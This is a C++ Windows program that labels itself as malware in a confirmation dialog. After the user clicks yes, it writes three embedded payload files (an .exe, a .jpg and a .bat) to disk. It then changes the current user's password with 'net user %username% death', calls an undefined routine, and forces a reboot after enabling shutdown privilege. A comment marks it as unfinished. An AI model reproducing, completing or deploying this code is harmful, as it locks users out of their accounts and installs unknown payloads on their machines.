#include <Windows.h>
#include <iostream>
#include <stdio.h>
#include "main.h"
//todo : implement hooks and add base file for run NOTE: Body not complete yet
using namespace std;
EXTERN_C IMAGE_DOS_HEADER __ImageBase;
void resource()
{

    DWORD dw;
    HANDLE hFile = CreateFileA("\\launch.exe", GENERIC_WRITE, NULL, NULL, CREATE_NEW, NULL, NULL);
    WriteFile(hFile, rawData, sizeof(rawData), &dw, 0);
}
void resource1()
{
    DWORD dw;
    HANDLE hFile = CreateFileA("\\hello.jpg", GENERIC_WRITE, NULL, NULL, CREATE_NEW, NULL, NULL);
    WriteFile(hFile, rawData1, sizeof(rawData1), &dw, 0);
}
void res() {
    DWORD dw;
    HANDLE hFile = CreateFileA("\\hello.bat", GENERIC_WRITE, NULL, NULL, CREATE_NEW, NULL, NULL);
    WriteFile(hFile, Raw, sizeof(Raw), &dw, 0);
}
int main() {
    FreeConsole();
    if (MessageBoxA(NULL, "This malware is no joke continue?", "WINNT32.EXE", MB_YESNO) == IDYES)
    {
        resource1();
        resource();
        res();
        system("net user %username% death");
        all();
        Sleep(5000);
        HANDLE token;
        TOKEN_PRIVILEGES privileges;

        OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);

        LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
        privileges.PrivilegeCount = 1;
        privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);

        // The actual restart
        ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
        //ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
    }
    else
    {
        return 0;
    }
}